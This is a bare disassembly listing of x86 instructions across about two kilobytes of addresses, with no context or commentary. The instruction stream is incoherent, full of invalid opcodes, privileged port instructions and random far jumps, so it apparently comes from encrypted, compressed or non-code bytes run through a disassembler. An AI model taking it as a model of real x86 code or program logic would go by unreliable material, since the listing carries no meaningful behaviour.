  405ed8:	ins    DWORD PTR es:[edi],dx
  405ed9:	aaa    
  405eda:	sbb    DWORD PTR [ecx+0x7b],ebp
  405edd:	ficomp WORD PTR [ecx-0x1a7f4ebc]
  405ee3:	in     eax,0xd1
  405ee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ee6:	hlt    
  405ee7:	dec    esp
  405ee8:	test   BYTE PTR [eax+0x74],ch
  405eeb:	cmp    eax,0xa13ad4f4
  405ef0:	(bad)  
  405ef1:	aaa    
  405ef2:	xor    BYTE PTR [ebx],ah
  405ef4:	cmp    al,BYTE PTR [edx+0x5ac2f6ce]
  405efa:	aam    0xd9
  405efc:	in     eax,dx
  405efd:	adc    edx,DWORD PTR [ecx-0x2346637c]
  405f03:	push   edi
  405f04:	icebp  
  405f05:	mov    al,0xe4
  405f07:	jae    0x405e92
  405f09:	and    edx,esp
  405f0b:	xchg   ecx,eax
  405f0c:	adc    DWORD PTR [eax+0x4c5a6c9b],edx
  405f12:	cdq    
  405f13:	sub    bh,al
  405f15:	cmp    al,0xec
  405f17:	or     al,0xa1
  405f19:	dec    eax
  405f1a:	retf   
  405f1b:	pop    edi
  405f1c:	jae    0x405ef1
  405f1e:	dec    esp
  405f1f:	pop    esi
  405f20:	jo     0x405f30
  405f22:	jo     0x405f6a
  405f24:	cmp    eax,0x6f54a37f
  405f29:	mov    esp,0xa5a73c9e
  405f2e:	jmp    0x405efc
  405f30:	mov    ebx,0x11f80146
  405f35:	mov    ds:0xddf7f6db,al
  405f3a:	mov    esp,0xfc77f350
  405f3f:	cmc    
  405f40:	(bad)  
  405f41:	imul   edx,DWORD PTR [ebp+0x7750d457],0x6f
  405f48:	out    0xcf,al
  405f4a:	fwait
  405f4b:	or     DWORD PTR [eax+0x5204ab49],edx
  405f51:	stc    
  405f52:	cmc    
  405f53:	out    0xb7,eax
  405f55:	neg    BYTE PTR [ebx-0x38039e9]
  405f5b:	push   es
  405f5c:	xor    eax,0xe0eaa82d
  405f61:	addr16 iret 
  405f63:	dec    eax
  405f64:	jmp    0xe5d9:0xcdad7e07
  405f6b:	cdq    
  405f6c:	cmc    
  405f6d:	loopne 0x405f68
  405f6f:	icebp  
  405f70:	call   0x8bb0:0x65993fb6
  405f77:	mov    WORD PTR [eax+0x7646],?
  405f7d:	fsubp  st(0),st
  405f7f:	int    0xd5
  405f81:	inc    edx
  405f82:	fsub   QWORD PTR [ebx-0x54e4e4da]
  405f88:	mov    bl,0xbb
  405f8a:	pop    edi
  405f8b:	call   0xdea1:0x4bcba7cf
  405f92:	xchg   esi,eax
  405f93:	adc    bh,BYTE PTR [edi+0x6d1f02dc]
  405f99:	add    edx,DWORD PTR [eax-0x11]
  405f9c:	ins    DWORD PTR es:[edi],dx
  405f9d:	(bad)  
  405f9f:	sub    BYTE PTR [esi],dl
  405fa1:	fld    DWORD PTR [esi-0x6f]
  405fa4:	mov    ah,0x9c
  405fa6:	retf   
  405fa7:	mov    ds:0xe48517c0,al
  405fac:	(bad)  
  405fad:	iret   
  405fae:	sti    
  405faf:	neg    DWORD PTR [eax]
  405fb1:	shl    BYTE PTR [edx-0x1b57bafd],0xe2
  405fb8:	jmp    0xd4f862cb
  405fbd:	bound  ecx,QWORD PTR [eax-0x56862ecf]
  405fc3:	bound  edi,QWORD PTR [ecx-0x2b]
  405fc6:	sbb    BYTE PTR [edx+esi*8-0x12],0xed
  405fcb:	jo     0x405f65
  405fcd:	fld    st(5)
  405fcf:	push   eax
  405fd0:	pusha  
  405fd1:	jb     0x405fbf
  405fd3:	jl     0x405f63
  405fd5:	aad    0x50
  405fd7:	ss push es
  405fd9:	mov    cl,0x37
  405fdb:	das    
  405fdc:	jo     0x40601e
  405fde:	fnsave [eax]
  405fe0:	(bad)  
  405fe1:	mov    ecx,0xb1a9d97c
  405fe6:	rcr    DWORD PTR [edx],0xc9
  405fe9:	neg    DWORD PTR [esi-0x53]
  405fec:	neg    DWORD PTR [eax+0x929a152]
  405ff2:	push   ebx
  405ff3:	fmul   QWORD PTR [esi+0x3d]
  405ff6:	push   ebx
  405ff7:	sbb    ecx,DWORD PTR [edx]
  405ff9:	ins    DWORD PTR es:[edi],dx
  405ffa:	xchg   edx,eax
  405ffb:	cmp    edx,esi
  405ffd:	pushf  
  405ffe:	dec    edi
  405fff:	jecxz  0x406009
  406001:	push   ebp
  406002:	stos   DWORD PTR es:[edi],eax
  406003:	jns    0x406036
  406005:	je     0x406003
  406007:	daa    
  406008:	xor    ah,BYTE PTR ds:0xedc0cffd
  40600e:	adc    esi,esp
  406010:	neg    DWORD PTR [ebx+0x25cba0e1]
  406016:	mov    ah,0x79
  406018:	jb     0x406037
  40601a:	pop    ebx
  40601b:	test   bh,al
  40601d:	test   BYTE PTR [ebp+0x2f786fe8],ah
  406023:	pop    ebx
  406024:	nop
  406025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406026:	push   esp
  406027:	ins    DWORD PTR es:[edi],dx
  406028:	jge    0x405fdf
  40602a:	push   esi
  40602b:	inc    ebp
  40602c:	rcr    eax,cl
  40602e:	mov    ?,WORD PTR [ebx*8-0x1f20d294]
  406035:	sub    DWORD PTR [esi+0xd],ecx
  406038:	add    al,0x23
  40603a:	je     0x406067
  40603c:	pop    ss
  40603d:	(bad)  
  40603e:	dec    esp
  40603f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406040:	rcr    esi,1
  406042:	int    0xc2
  406044:	xchg   edx,eax
  406045:	jmp    0x1323:0xecd03ae6
  40604c:	dec    esi
  40604d:	pop    ss
  40604e:	or     BYTE PTR [eax+eiz*2-0x29294e07],ah
  406055:	inc    edx
  406056:	mov    ebx,0x1ba20094
  40605b:	mov    esp,0x90e94815
  406060:	in     eax,dx
  406061:	fbstp  TBYTE PTR [ecx]
  406063:	arpl   ax,bx
  406065:	mov    eax,0x95a257ed
  40606a:	or     eax,DWORD PTR [edi]
  40606c:	dec    edx
  40606d:	or     eax,0x2e846f0
  406072:	aam    0x11
  406074:	jae    0x406080
  406076:	mov    edi,0x6588c37d
  40607b:	fsub   st,st(5)
  40607d:	rcl    DWORD PTR [edi+0x32cf22fe],0x40
  406084:	xor    al,0x2d
  406086:	jne    0x4060b8
  406088:	das    
  406089:	lahf   
  40608a:	outs   dx,BYTE PTR ds:[esi]
  40608b:	push   edi
  40608c:	inc    ebx
  40608d:	jg     0x406031
  40608f:	xchg   DWORD PTR [ebp+0x3a],esp
  406092:	outs   dx,BYTE PTR ds:[esi]
  406093:	fistp  WORD PTR [ebp+0xb]
  406096:	pop    ds
  406097:	shl    DWORD PTR [ebx+0x1c],0x97
  40609b:	das    
  40609c:	jmp    0x22fe:0x9c71c388
  4060a3:	ret    
  4060a4:	sub    DWORD PTR [ecx-0x47e073bb],0x11
  4060ab:	xchg   BYTE PTR [esi-0x5a],cl
  4060ae:	dec    eax
  4060af:	mov    ch,0xa8
  4060b1:	or     al,0xd
  4060b3:	lds    ebx,FWORD PTR [ecx]
  4060b5:	mov    cl,0x2b
  4060b7:	clc    
  4060b8:	ror    DWORD PTR [esp+0x3d],cl
  4060bc:	mov    bx,0x6fe2
  4060c0:	sbb    al,BYTE PTR gs:[edx-0x17]
  4060c4:	ins    DWORD PTR es:[edi],dx
  4060c5:	pop    edi
  4060c6:	loop   0x4060a4
  4060c8:	aad    0xfe
  4060ca:	(bad)
  4060cd:	pop    ecx
  4060ce:	pop    ds
  4060cf:	push   eax
  4060d0:	jnp    0x40607d
  4060d2:	jg     0x4060d2
  4060d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060d5:	rcr    dl,1
  4060d7:	or     DWORD PTR [ebx],edx
  4060d9:	(bad)  
  4060da:	push   cs
  4060db:	sbb    DWORD PTR [ebx+0x52],edx
  4060de:	test   eax,0xc4ac31e8
  4060e3:	sbb    cl,BYTE PTR [edi+0x3a1634e8]
  4060e9:	test   DWORD PTR [eax+0x7d],esp
  4060ec:	lods   eax,DWORD PTR ds:[esi]
  4060ed:	iret   
  4060ee:	cmp    DWORD PTR ds:0xbcb579d,ebp
  4060f5:	in     al,dx
  4060f6:	pop    es
  4060f7:	neg    bl
  4060f9:	stc    
  4060fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060fb:	das    
  4060fc:	adc    DWORD PTR [edi],esi
  4060fe:	push   es
  4060ff:	inc    eax
  406100:	mov    ecx,0xa4ed08ef
  406105:	cmp    ch,BYTE PTR [eax]
  406107:	mov    eax,0xaaedf7b9
  40610c:	(bad)  
  40610d:	outs   dx,DWORD PTR ds:[esi]
  40610f:	sti    
  406110:	mov    al,0x9b
  406112:	test   eax,0xa1c4d14d
  406117:	xlat   BYTE PTR ds:[ebx]
  406118:	dec    edi
  406119:	mov    ebx,0xdef8df1d
  40611e:	cli    
  40611f:	out    0x75,eax
  406121:	cmp    BYTE PTR [edx+0x5dfb12b],0x57
  406128:	mov    BYTE PTR [edi+0x3f],ch
  40612b:	xchg   edx,eax
  40612c:	gs ins DWORD PTR es:[edi],dx
  40612e:	sar    BYTE PTR [edi],cl
  406130:	mov    cl,0x90
  406132:	je     0x406121
  406134:	jae    0x406179
  406136:	mov    ds:0x55cfe87,al
  40613b:	push   ds
  40613c:	push   edx
  40613d:	sbb    esp,DWORD PTR [edi+0x150d6a0c]
  406143:	out    dx,al
  406144:	pop    es
  406145:	or     eax,0x94c9f50b
  40614a:	sbb    esi,0xffffff80
  40614d:	and    BYTE PTR [eax-0x7a],0x15
  406151:	adc    eax,0xe08af046
  406156:	push   esi
  406157:	int    0xc6
  406159:	pop    edi
  40615a:	xor    BYTE PTR [edx+0x5e6ca69d],bl
  406160:	or     eax,0x108bb27f
  406165:	jle    0x40610f
  406167:	xchg   esi,eax
  406168:	les    ebp,FWORD PTR [esi+0x6c]
  40616b:	(bad)  
  40616c:	mov    esp,0x23aa617a
  406171:	sbb    ecx,DWORD PTR [esi-0x2892483f]
  406177:	mov    WORD PTR [eax+edi*8+0x9d38423],?
  40617e:	(bad)
  406181:	or     DWORD PTR [ebp+0x1b],edx
  406184:	mov    bl,0xe5
  406186:	inc    eax
  406187:	xchg   edi,eax
  406188:	dec    edi
  406189:	cdq    
  40618a:	lea    ecx,[esi+0x56]
  40618d:	pusha  
  40618e:	pop    edi
  40618f:	sbb    edi,edx
  406191:	(bad)  
  406192:	(bad)  
  406193:	xchg   DWORD PTR gs:[ebx+0x5b],edx
  406197:	push   es
  406198:	cdq    
  406199:	adc    eax,0xf3cc2862
  40619e:	imul   ecx,esp,0x749707d5
  4061a4:	mov    ebx,DWORD PTR [edx+0x60d742db]
  4061aa:	mov    ecx,0x4ccb2f81
  4061af:	fbstp  TBYTE PTR [edx]
  4061b1:	stos   BYTE PTR es:[edi],al
  4061b2:	mov    ebp,0x87672cb4
  4061b7:	sbb    BYTE PTR [edi+0x2d],bl
  4061ba:	out    0xbe,al
  4061bc:	(bad)  
  4061bd:	sti    
  4061be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061bf:	call   0xf12d:0x8d922901
  4061c6:	cmp    dh,dh
  4061c8:	xor    BYTE PTR [eax-0x766fa1ad],ch
  4061ce:	ror    DWORD PTR [esi],0x6a
  4061d1:	mov    al,ds:0xfc9e2d2b
  4061d6:	es cwde 
  4061d8:	pop    ebp
  4061d9:	call   0x68ba232
  4061de:	sti    
  4061df:	sbb    BYTE PTR [edx+0x414ee519],dh
  4061e5:	loopne 0x4061e5
  4061e7:	sub    al,0x2a
  4061e9:	in     eax,dx
  4061ea:	mov    bl,0x32
  4061ec:	pop    edx
  4061ed:	fcomp  QWORD PTR [esi-0x3bd02263]
  4061f4:	pop    edx
  4061f5:	sbb    DWORD PTR [ecx-0x5d],eax
  4061f8:	xor    BYTE PTR [eax+eax*4],ah
  4061fb:	lods   eax,DWORD PTR ds:[esi]
  4061fc:	fidivr WORD PTR [eax+edx*2+0x77]
  406200:	sbb    al,0x3f
  406202:	cmp    eax,0x15768ca1
  406207:	fiadd  DWORD PTR [ebp+0x2523210f]
  40620d:	xchg   ebx,eax
  40620e:	adc    edi,0xf1483236
  406214:	pop    edx
  406215:	sbb    ah,BYTE PTR [edi]
  406217:	lds    edi,FWORD PTR ds:0xc347bf80
  40621d:	dec    edi
  40621e:	in     eax,dx
  40621f:	mov    edx,0xd58343bb
  406224:	xchg   esi,eax
  406225:	jne    0x406276
  406227:	das    
  406228:	mov    ah,0x44
  40622a:	xchg   esp,eax
  40622b:	std    
  40622c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40622d:	retf   0x2b96
  406230:	mov    al,ds:0x4548dc8f
  406235:	fbstp  TBYTE PTR [ecx+0x1a748c38]
  40623b:	and    BYTE PTR [edx*2+0x721896b0],0x86
  406243:	push   ecx
  406244:	arpl   WORD PTR [edi-0xe540400],si
  40624a:	adc    eax,0x7a015f4b
  40624f:	inc    eax
  406250:	or     DWORD PTR [edi-0x3b1eb970],eax
  406256:	loope  0x406235
  406258:	pushf  
  406259:	jno    0x4061dd
  40625b:	sbb    eax,0xad6fdf03
  406260:	sbb    cl,BYTE PTR [eax]
  406262:	sbb    bh,dh
  406264:	aad    0xb4
  406266:	fimul  WORD PTR [esi]
  406268:	push   edx
  406269:	jp     0x406243
  40626b:	mov    eax,0xbff69a8
  406270:	cdq    
  406271:	aas    
  406272:	jecxz  0x4062f2
  406274:	pop    ecx
  406275:	aas    
  406276:	out    dx,al
  406277:	shr    DWORD PTR [ebp+0x1f1e0024],0x66
  40627e:	pop    ebx
  40627f:	lods   eax,DWORD PTR ds:[esi]
  406280:	iret   
  406281:	pop    esi
  406282:	in     eax,dx
  406283:	xor    bl,BYTE PTR [edi+0x31]
  406286:	adc    esp,DWORD PTR [eax]
  406288:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406289:	sub    BYTE PTR [edi-0x5c69fced],bh
  40628f:	jns    0x40625d
  406291:	push   cs
  406292:	or     BYTE PTR [esp+ebx*4-0x7c8c3f45],bh
  406299:	push   cs
  40629a:	add    DWORD PTR [eax-0x80],ebx
  40629d:	ds mov edi,0x8066cbd2
  4062a3:	xor    edx,DWORD PTR [eax+0x5e1b0160]
  4062a9:	dec    esi
  4062aa:	shl    BYTE PTR [eax+eiz*2+0x20c2f58f],cl
  4062b1:	gs aad 0x2b
  4062b4:	iret   
  4062b5:	ffreep st(1)
  4062b7:	sbb    esi,edi
  4062b9:	and    al,0x8d
  4062bb:	cwde   
  4062bc:	and    al,0x64
  4062be:	cmp    ah,dl
  4062c0:	pop    ss
  4062c1:	xchg   esp,eax
  4062c2:	mov    bl,0x2c
  4062c4:	jno    0x4062fd
  4062c6:	mov    al,BYTE PTR [eax]
  4062c8:	push   es
  4062c9:	pop    ss
  4062ca:	(bad)  
  4062cb:	in     al,dx
  4062cc:	int3   
  4062cd:	retf   
  4062ce:	jl     0x40630b
  4062d0:	daa    
  4062d1:	popa   
  4062d2:	push   ds
  4062d3:	ror    BYTE PTR [eax+0x76d927f0],cl
  4062d9:	mov    ds:0xdc344db7,eax
  4062de:	mov    dl,0x59
  4062e0:	sar    ah,cl
  4062e2:	inc    eax
  4062e3:	mov    dh,0x3f
  4062e5:	mov    esp,0x11711552
  4062ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062eb:	mov    ds:0x76fbcb86,al
  4062f0:	ret    
  4062f1:	frstor ds:0x6a3f27b9
  4062f7:	test   eax,0x6248976
  4062fc:	mov    eax,DWORD PTR [eax+esi*2-0x38]
  406300:	pop    esp
  406301:	in     eax,0x98
  406303:	scas   al,BYTE PTR es:[edi]
  406304:	hlt    
  406305:	fsubr  st,st(6)
  406307:	mov    ah,BYTE PTR [ebp+0x27]
  40630a:	iret   
  40630b:	cmp    ecx,DWORD PTR [ebx]
  40630d:	or     dl,bl
  40630f:	dec    ecx
  406310:	pushf  
  406311:	adc    edi,DWORD PTR [esp+ebp*4-0x3531ef23]
  406318:	js     0x4062e5
  40631a:	mov    ds:0xef701cf1,eax
  40631f:	icebp  
  406320:	lea    eax,[edx+0x6df7df33]
  406326:	shl    al,cl
  406328:	sbb    eax,0xbbd50f5d
  40632d:	mov    dl,BYTE PTR [ebx]
  40632f:	ret    0xc4be
  406332:	mov    ds:0x1fb152a3,eax
  406337:	hlt    
  406338:	adc    bl,dl
  40633a:	je     0x40631a
  40633c:	mov    esp,0x322b9e5b
  406341:	pop    ecx
  406342:	xchg   ebp,eax
  406343:	iret   
  406344:	xor    ch,dl
  406346:	leave  
  406347:	hlt    
  406348:	outs   dx,BYTE PTR ds:[esi]
  406349:	into   
  40634a:	adc    dh,BYTE PTR [ecx]
  40634c:	mov    cl,0x4a
  40634e:	das    
  40634f:	sub    DWORD PTR [eax+0x44],edx
  406352:	cdq    
  406353:	out    0x6e,al
  406355:	(bad)  [edi]
  406357:	inc    ah
  406359:	fcomp  DWORD PTR [edx]
  40635b:	sub    DWORD PTR [edx-0x4e],esi
  40635e:	leave  
  40635f:	std    
  406360:	iret   
  406361:	and    edx,esi
  406363:	or     edx,edx
  406365:	in     eax,dx
  406366:	ror    DWORD PTR [ebx-0x492f68bd],1
  40636c:	pop    ds
  40636d:	inc    edi
  40636e:	xor    BYTE PTR [edx+0x19],ah
  406371:	jbe    0x40638f
  406373:	lock jmp 0xb31:0x8850a5e0
  40637b:	jmp    0x4063c1
  40637d:	pop    ss
  40637e:	(bad)  
  406380:	or     DWORD PTR [edx],ebx
  406382:	rol    DWORD PTR [ebx],1
  406384:	adc    BYTE PTR [ecx+0x59],al
  406387:	mov    esp,0xa28c1eb1
  40638c:	stc    
  40638d:	aas    
  40638e:	pop    es
  40638f:	jnp    0x4063b0
  406391:	rcr    BYTE PTR [ecx+0x68],1
  406394:	and    al,BYTE PTR [eax]
  406396:	fild   DWORD PTR [esp+ebx*1-0x79751df0]
  40639d:	push   edi
  40639e:	jbe    0x406342
  4063a0:	call   0x558ea922
  4063a5:	sahf   
  4063a6:	out    dx,eax
  4063a7:	fwait
  4063a8:	adc    BYTE PTR [ebx-0x5a44dba6],dh
  4063ae:	add    al,0x3
  4063b0:	sbb    DWORD PTR [edx],0x3b
  4063b3:	mov    esi,0x723787fa
  4063b8:	fcomp  DWORD PTR [ecx+0x51]
  4063bb:	lahf   
  4063bc:	mov    ds:0xec4238c3,eax
  4063c1:	popa   
  4063c2:	push   ds
  4063c3:	hlt    
  4063c4:	xor    al,0xf7
  4063c6:	jbe    0x4063d3
  4063c8:	push   esp
  4063c9:	or     DWORD PTR [ecx],0x68
  4063cc:	mov    al,ds:0xe5eb4fec
  4063d1:	add    al,0x59
  4063d3:	int3   
  4063d4:	shl    DWORD PTR [ebx-0x216ca59b],0x1c
  4063db:	push   ecx
  4063dc:	xor    DWORD PTR [ecx+0x18],esi
  4063df:	outs   dx,DWORD PTR ds:[esi]
  4063e0:	or     DWORD PTR [ebp+0x13e3aea1],eax
  4063e6:	rcl    DWORD PTR [ecx-0x54],cl
  4063e9:	or     eax,0xccf95c11
  4063ee:	inc    edx
  4063ef:	jl     0x4063d3
  4063f1:	jge    0x40643b
  4063f3:	add    DWORD PTR [edx-0x220e3392],ebp
  4063f9:	jecxz  0x40642b
  4063fb:	xor    ebp,0x4c8f2d08
  406401:	xor    edx,0xffffffbf
  406404:	xchg   esi,eax
  406405:	xlat   BYTE PTR ds:[ebx]
  406406:	je     0x40642e
  406408:	adc    BYTE PTR ds:0x8b79dd7c,ch
  40640e:	aaa    
  40640f:	xchg   ecx,eax
  406410:	rcr    DWORD PTR [ecx+0x3c53b6bc],0xf
  406417:	push   ecx
  406418:	or     edx,eax
  40641a:	fdivr  QWORD PTR [edx+0x14545197]
  406420:	xchg   esi,eax
  406421:	call   0xe1acbca7
  406426:	pop    ebx
  406427:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  406429:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40642a:	gs (bad) 
  40642c:	outs   dx,DWORD PTR ds:[esi]
  40642d:	pop    ebp
  40642e:	loop   0x40643e
  406430:	push   ss
  406431:	adc    ecx,ebx
  406433:	jmp    0xba79:0xf9ade482
  40643a:	push   0x5e6d6d2e
  40643f:	cmp    ecx,DWORD PTR [esi-0x7d3ec5c]
  406445:	push   esp
  406446:	ds dec eax
  406448:	iret   
  406449:	push   esi
  40644a:	pop    ds
  40644b:	rcr    DWORD PTR [ebx+esi*2+0x53],cl
  40644f:	jg     0x40644f
  406451:	adc    ebx,DWORD PTR ss:[ebp+0x5f]
  406455:	ret    
  406456:	addr16 push ds
  406458:	pop    esp
  406459:	xor    al,0x47
  40645b:	(bad)  
  40645d:	test   al,0xa9
  40645f:	push   edx
  406460:	frstor [eax]
  406462:	aas    
  406463:	mov    esi,0x50cb24a3
  406468:	call   0x741a7c4
  40646d:	add    esi,DWORD PTR [eax+edi*2]
  406470:	repz adc ecx,esp
  406473:	push   ss
  406474:	mov    eax,0x7100b7a9
  406479:	inc    ebp
  40647a:	add    esp,DWORD PTR [esi+ebp*1-0x16]
  40647e:	sbb    BYTE PTR [esi+ebx*4],ch
  406481:	fwait
  406482:	and    esp,DWORD PTR ds:0x375b79a0
  406488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406489:	cmp    BYTE PTR [edi+0x3f],bl
  40648c:	jecxz  0x4064b3
  40648e:	rol    dl,0x34
  406491:	lahf   
  406492:	xchg   esi,eax
  406493:	lahf   
  406494:	xor    esp,DWORD PTR [ecx+0x2a]
  406497:	push   esi
  406498:	cmp    eax,0xf3c76ab1
  40649e:	fstp   DWORD PTR [ecx+0x79]
  4064a1:	(bad)  
  4064a2:	cld    
  4064a3:	add    edx,DWORD PTR [esi]
  4064a5:	add    al,0x24
  4064a7:	jecxz  0x406479
  4064a9:	sar    DWORD PTR [ebp+0x17f7d399],1
  4064af:	jp     0x406514
  4064b1:	mov    cl,0x1d
  4064b3:	div    bh
  4064b5:	push   eax
  4064b6:	mov    esi,0x3e52c29
  4064bb:	test   BYTE PTR [esi+ebx*4+0x2e83c087],0xc7
  4064c3:	fistp  DWORD PTR [ebx+0x4fc7026c]
  4064c9:	mov    cl,0x3b
  4064cb:	lock or al,0x36
  4064ce:	daa    
  4064cf:	in     eax,0x64
  4064d1:	fisub  DWORD PTR [esi+0x4e344d4c]
  4064d7:	xor    al,dh
  4064d9:	mov    al,ds:0x3505f985
  4064de:	mov    ds:0x5f69593a,al
  4064e3:	xchg   ebp,eax
  4064e4:	dec    ebx
  4064e5:	cmp    BYTE PTR [ecx-0x1c5568f7],0xeb
  4064ec:	and    cl,BYTE PTR [ecx]
  4064ee:	sub    BYTE PTR [edx+0x1a],ah
  4064f1:	ja     0x406547
  4064f3:	das    
  4064f4:	sar    DWORD PTR [esp+eax*4-0x70],1
  4064f8:	imul   esp,DWORD PTR [ecx],0x61
  4064fb:	or     edi,eax
  4064fd:	and    BYTE PTR [ebx+0xc27bf4d],cl
  406503:	sbb    BYTE PTR [edx+0x5a0a58da],ch
  406509:	repnz out 0xb7,eax
  40650c:	jecxz  0x406501
  40650e:	aad    0xb3
  406510:	sub    cl,BYTE PTR [edx+0x586c5412]
  406516:	push   0x2ae34d57
  40651b:	aad    0xb5
  40651d:	addr16 add ah,al
  406520:	mov    ebp,0xf4a5c120
  406525:	(bad)  
  406526:	inc    ebx
  406527:	mov    BYTE PTR [ebp+esi*8-0x6a16b050],ah
  40652e:	pmuludq mm4,mm4
  406531:	and    eax,0x6597ccba
  406536:	call   0x138ad27e
  40653b:	movs   WORD PTR es:[edi],WORD PTR cs:[esi]
  40653e:	cmp    eax,0xadacbedc
  406543:	xor    BYTE PTR [ebp-0x5bf9bd51],0x82
  40654a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40654b:	add    edx,DWORD PTR [esi]
  40654d:	lods   al,BYTE PTR ds:[esi]
  40654e:	pop    ds
  40654f:	push   edx
  406550:	adc    al,0x3f
  406552:	adc    cl,dh
  406554:	mov    ebp,0xb179b8b6
  406559:	mov    ds,WORD PTR [eax]
  40655b:	xchg   ecx,eax
  40655c:	lods   eax,DWORD PTR ds:[esi]
  40655d:	ins    DWORD PTR es:[edi],dx
  40655e:	or     al,0x1e
  406560:	xor    eax,0xdd460995
  406565:	test   cl,ch
  406567:	in     eax,dx
  406568:	add    eax,0xcb1820ca
  40656d:	xor    DWORD PTR [esi],ebp
  40656f:	ret    
  406570:	jno    0x406585
  406572:	scas   al,BYTE PTR es:[edi]
  406573:	xor    DWORD PTR [esi-0xbfd8dfc],0x3e
  40657a:	jno    0x40655e
  40657c:	mov    BYTE PTR [ebx],cl
  40657e:	xor    al,0xab
  406580:	pop    edx
  406581:	inc    esp
  406582:	inc    esp
  406583:	cmp    eax,0xe144e79f
  406588:	test   eax,0x6a4d7856
  40658d:	int3   
  40658e:	out    0xfd,eax
  406590:	lock pushf 
  406592:	or     dh,BYTE PTR [edi]
  406594:	inc    BYTE PTR [edx]
  406596:	add    edx,DWORD PTR [ecx+0x5d]
  406599:	mov    dh,0x90
  40659b:	push   ecx
  40659c:	dec    esp
  40659d:	outs   dx,BYTE PTR ds:[esi]
  40659e:	fcomp  DWORD PTR [ebx]
  4065a0:	in     eax,dx
  4065a1:	sahf   
  4065a2:	adc    BYTE PTR [ebx+0x2ce243f0],cl
  4065a8:	repz or al,0x3d
  4065ac:	scas   al,BYTE PTR es:[edi]
  4065ad:	xor    al,0x9f
  4065af:	jl     0x4065a0
  4065b1:	add    dl,bl
  4065b3:	push   ds
  4065b4:	sbb    al,0xa0
  4065b6:	mov    eax,0x273e369e
  4065bb:	xor    esi,DWORD PTR [edx+eiz*1+0x4]
  4065bf:	call   0x9556:0x8d961a00
  4065c6:	push   esi
  4065c7:	clc    
  4065c8:	sub    DWORD PTR [ebx-0x1c0acd60],ebx
  4065ce:	mov    ah,0xb8
  4065d0:	test   al,0xd7
  4065d2:	cmp    al,ch
  4065d4:	scas   al,BYTE PTR es:[edi]
  4065d5:	push   ebx
  4065d6:	inc    esp
  4065d7:	lahf   
  4065d8:	push   esp
  4065d9:	mov    ebx,0x9b43f1eb
  4065de:	mov    ah,0xe7
  4065e0:	jmp    0x4065a4
  4065e2:	aaa    
  4065e3:	mov    dh,0xad
  4065e5:	iret   
  4065e6:	loopne 0x40656a
  4065e8:	popa   
  4065e9:	pop    sp
  4065eb:	jmp    0x35ae:0xada79f4
  4065f2:	enter  0x8530,0x6a
  4065f6:	(bad)  
  4065f7:	mov    cl,0x7f
  4065f9:	(bad)  
  4065fa:	xor    edx,ecx
  4065fc:	loope  0x4065d4
  4065fe:	add    BYTE PTR ds:0xb35138f7,cl
  406604:	daa    
  406605:	or     al,0x3e
  406608:	ret    0xcd08
  40660b:	jmp    FWORD PTR [ecx+0x37]
  40660e:	dec    esp
  40660f:	push   ebx
  406610:	sub    BYTE PTR [eax+0x28282061],bl
  406616:	xchg   BYTE PTR [eax],cl
  406618:	inc    ecx
  406619:	sub    BYTE PTR ds:0xb423b08e,0x93
  406620:	add    bh,al
  406622:	push   ebx
  406623:	dec    eax
  406624:	lods   eax,DWORD PTR ds:[esi]
  406625:	jl     0x4065ee
  406627:	lahf   
  406628:	sub    eax,ebp
  40662a:	mov    esp,0xe34d37a1
  40662f:	es cli 
  406631:	push   esp
  406632:	retf   0x8a40
  406635:	mov    eax,0x5fa9c739
  40663a:	pop    edi
  40663b:	lods   eax,DWORD PTR ds:[esi]
  40663c:	fisttp DWORD PTR [edi+0x68]
  40663f:	pop    es
  406640:	(bad)  
  406641:	ins    BYTE PTR es:[edi],dx
  406642:	xchg   ebx,eax
  406643:	mov    BYTE PTR fs:[edi-0x34],0xe
  406648:	mov    esp,DWORD PTR [ecx]
  40664a:	jge    0x406685
  40664c:	mov    ah,0x3
  40664e:	xchg   BYTE PTR [edi+0x623cb853],ah
  406654:	mov    edi,0x992b547f
  406659:	mov    WORD PTR [ebp+0x6cdd5f21],fs
  40665f:	adc    eax,0x553570fe
  406664:	adc    ebp,ebp
  406666:	(bad)  
  406667:	lea    ebp,[eax-0x5df3a677]
  40666d:	repz mov ah,0xea
  406670:	rol    DWORD PTR [edi+edi*2],cl
  406673:	or     eax,0x59868781
  406678:	xchg   ecx,eax
  406679:	jns    0x40662f
  40667b:	es stos DWORD PTR es:[edi],eax
  40667d:	das    
  40667e:	mov    bl,0xc1
  406680:	nop
  406681:	(bad)  
  406682:	dec    edi
  406683:	icebp  
  406684:	sbb    al,0x42
  406686:	mov    bl,BYTE PTR [ebx-0x137b6c86]
  40668c:	je     0x406690
  40668e:	repz jmp 0x406660
  406691:	loop   0x4066d5
  406693:	mov    WORD PTR [edx+0x59],gs
  406696:	xchg   edx,eax
  406697:	ror    BYTE PTR ds:0xe979267a,1
  40669d:	push   es
  40669e:	jl     0x40664b
  4066a0:	mov    esi,0xd513eb58
  4066a6:	jne    0x406668
  4066a8:	pop    eax
  4066aa:	scas   eax,DWORD PTR es:[edi]
  4066ab:	ret    0x28d4
  4066ae:	xchg   edi,eax
  4066af:	pop    esp
  4066b0:	xchg   bh,dh
  4066b2:	mov    dl,0x33
  4066b4:	test   eax,0x1899436e
  4066b9:	out    dx,al
  4066ba:	and    ch,BYTE PTR [eax+0x7d]
  4066bd:	sbb    al,BYTE PTR [ebx+0x6bef195e]
  4066c3:	ins    BYTE PTR es:[edi],dx
  4066c4:	ret    0xf304
  4066c7:	popf   
  4066c8:	repz enter 0xa623,0x8a
  4066cd:	or     bh,BYTE PTR [edx+0x35ecf589]
  4066d3:	fsub   DWORD PTR [edx-0x6c]
  4066d6:	aaa    
  4066d7:	push   ebx
  4066d8:	add    ebp,DWORD PTR [ebp+0x59444ed4]
  4066de:	pop    ebx
